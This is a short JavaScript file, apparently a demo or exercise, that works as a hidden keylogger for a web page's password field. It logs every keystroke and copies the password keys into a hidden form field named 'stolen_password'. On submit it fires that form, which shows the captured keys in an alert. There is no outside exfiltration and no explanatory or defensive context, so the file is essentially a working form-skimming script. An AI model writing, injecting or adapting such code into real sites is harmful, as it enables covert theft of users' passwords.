document.addEventListener("DOMContentLoaded", function(){

    document.addEventListener("keydown", (e) => {
        console.log(e.code)
    })

    writeForm()
    let password = document.querySelector("#password")
    

    password.addEventListener('keydown', (e) => {
        let steal_input = document.querySelector("#hax")
        steal_input.value += ` ${e.code}`
    })

    let submit = document.querySelector("#submit")
    submit.addEventListener("click", (e) => {
        let form = document.querySelector("#hax-submit")
        form.onsubmit()
    })
    
})

let writeForm = () => {
    form = document.createElement("form")
    form.style.visibility = "hidden"
    form.id = "hax-submit"
    input = document.createElement('input')
    input.type = 'text'
    input.name = "stolen_password"
    input.id = "hax"
    form.onsubmit = (e) => { 
        // e.preventDefault()
        alert(`Password is ${input.value}`)
        return false
    }
    form.appendChild(input)
    document.body.appendChild(form)
}